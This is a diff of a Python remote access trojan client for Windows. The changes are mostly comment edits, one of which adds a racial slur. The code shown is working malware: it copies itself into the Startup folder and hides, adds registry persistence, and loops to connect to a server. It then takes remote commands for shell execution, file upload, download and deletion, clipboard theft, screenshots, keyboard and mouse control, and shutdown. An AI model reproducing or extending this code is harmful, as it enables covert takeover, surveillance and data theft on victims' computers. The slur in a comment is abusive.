@@ -22,7 +22,7 @@ def send_data(sock, data):
         pass
         
 # ============================================
-# SELF-REPLICATE TO PERMANENT LOCATION
+# being a worm
 # ============================================
 def replicate_to_permanent_location():
     """Copy the running executable to the Startup folder and hide it."""
@@ -57,7 +57,7 @@ def replicate_to_permanent_location():
         return None
 
 # ============================================
-# PERSISTENCE FUNCTION (UPDATED – ONLY ONE)
+# PERSISTENCE FUNCTION
 # ============================================
 def add_persistence():
     """Add the PERMANENT copy of the client to Windows startup registry."""
@@ -88,7 +88,7 @@ def add_persistence():
         return False
 
 # ============================================
-# CONNECT TO SERVER
+# CONNECT To The server
 # ============================================
 while True:
     try:
@@ -99,14 +99,14 @@ while True:
         time.sleep(5)
 
 # ============================================
-# ADD PERSISTENCE (NOW ACTUALLY CALLED)
+# PERSISTENCE
 # ============================================
 replicate_to_permanent_location()
 add_persistence()
 
 
 # ============================================
-# MAIN COMMAND LOOP
+# loop command nigar
 # ============================================
 while True:
     try:
@@ -115,7 +115,7 @@ while True:
         if command.lower() == "exit":
             break
             
-        # System info command
+        
         elif command.lower() == "sysinfo":
             try:
                 cpu_info = subprocess.getoutput("wmic cpu get name /value").strip()
@@ -137,7 +137,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Sysinfo failed: {str(e)}\n")
                 
-        # User info command
+        
         elif command.lower() == "whoami":
             try:
                 output = subprocess.getoutput("whoami")
@@ -145,7 +145,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] whoami failed: {str(e)}\n")
                 
-        # Current working directory
+        
         elif command.lower() == "cwd":
             try:
                 cwd = os.getcwd()
@@ -153,7 +153,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] cwd failed: {str(e)}\n")
                 
-        # Change directory
+        
         elif command.startswith("cd "):
             path = command[3:].strip()
             try:
@@ -162,7 +162,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] cd failed: {str(e)}\n")
                 
-        # Execute shell command
+        
         elif command.startswith("shell "):
             cmd = command[6:].strip()
             try:
@@ -171,7 +171,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] shell command failed: {str(e)}\n")
                 
-        # Mouse movement
+        
         elif command.startswith("mousemove "):
             try:
                 parts = command.split()
@@ -185,7 +185,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] mousemove failed: {str(e)}\n")
                 
-        # Left click
+        
         elif command.lower() == "click":
             try:
                 pyautogui.click()
@@ -193,7 +193,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] click failed: {str(e)}\n")
                 
-        # Right click
+        
         elif command.lower() == "rightclick":
             try:
                 pyautogui.rightClick()
@@ -201,7 +201,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] rightclick failed: {str(e)}\n")
                 
-        # Type text
+        
         elif command.startswith("type "):
             text = command[5:].strip()
             try:
@@ -210,7 +210,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] type failed: {str(e)}\n")
                 
-        # Paste text
+        
         elif command.startswith("paste "):
             text = command[6:].strip()
             try:
@@ -220,7 +220,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] paste failed: {str(e)}\n")
                 
-        # Copy clipboard content
+        
         elif command.lower() == "copyclip":
             try:
                 content = pyperclip.paste()
@@ -228,7 +228,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Failed to get clipboard: {str(e)}\n")
                 
-        # Upload file
+        
         elif command.startswith("upload "):
             file_path = command[7:].strip()
             try:
@@ -244,7 +244,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Upload failed: {str(e)}\n")
                 
-        # Download file
+        
         elif command.startswith("download "):
             file_path = command[9:].strip()
             try:
@@ -255,7 +255,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Download failed: {str(e)}\n")
                 
-        # Delete file or directory
+        
         elif command.startswith("delete "):
             path = command[7:].strip()
             try:
@@ -267,7 +267,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Delete failed: {str(e)}\n")
                 
-        # List directory contents
+        
         elif command.startswith("list "):
             path = command[5:].strip()
             try:
@@ -284,7 +284,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] List failed: {str(e)}\n")
                 
-        # Move files or directories
+        
         elif command.startswith("move "):
             try:
                 parts = command[5:].strip().split(' ', 1)
@@ -297,7 +297,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Move failed: {str(e)}\n")
                 
-        # Search for files
+        
         elif command.startswith("search "):
             filename = command[7:].strip()
             try:
@@ -327,7 +327,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Search failed: {str(e)}\n")
                 
-        # Directory tree
+        
         elif command.startswith("tree "):
             path = command[5:].strip()
             try:
@@ -336,7 +336,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Tree failed: {str(e)}\n")
                 
-        # Take screenshot
+        
         elif command.lower() == "screenshot":
             try:
                 screenshot = pyautogui.screenshot()
@@ -349,7 +349,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Screenshot error: {str(e)}")
                 
-        # System shutdown
+        
         elif command.lower() == "shutdown":
             try:
                 subprocess.call("shutdown /s /t 0", shell=True)
@@ -357,7 +357,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Shutdown failed: {str(e)}\n")
                 
-        # System restart
+        
         elif command.lower() == "restart":
             try:
                 subprocess.call("shutdown /r /t 0", shell=True)
@@ -365,7 +365,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Restart failed: {str(e)}\n")
                 
-        # User logoff
+        
         elif command.lower() == "logoff":
             try:
                 subprocess.call("shutdown /l", shell=True)
@@ -373,7 +373,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Logoff failed: {str(e)}\n")
                 
-        # Lock screen
+        
         elif command.lower() == "lock":
             try:
                 subprocess.call("rundll32.exe user32.dll,LockWorkStation", shell=True)
@@ -381,7 +381,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Lock failed: {str(e)}\n")
                 
-        # Hibernate system
+        
         elif command.lower() == "hibernate":
             try:
                 subprocess.call("shutdown /h", shell=True)
@@ -389,7 +389,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Hibernate failed: {str(e)}\n")
                 
-        # List running processes
+        
         elif command.lower() == "processes":
             try:
                 output = subprocess.check_output("tasklist /fo table", shell=True)
@@ -397,7 +397,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Failed to list processes: {str(e)}\n")
                 
-        # Close connection
+        
         elif command.lower() == "close":
             try:
                 send_data(s, "[+] Connection closed by client.\n")
@@ -406,7 +406,7 @@ while True:
             except Exception as e:
                 break
                 
-        # Run application
+        
         elif command.startswith("run "):
             app = command[4:].strip()
             try:
@@ -415,7 +415,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Failed to launch app: {str(e)}\n")
                 
-        # Close application
+        
         elif command.startswith("close "):
             app = command[6:].strip()
             try:
@@ -424,7 +424,7 @@ while True:
             except Exception as e:
                 send_data(s, f"[-] Failed to close app: {str(e)}\n")
                 
-        # Default: execute as shell command
+        # execute as shell command
         else:
             try:
                 output = subprocess.getoutput(command)
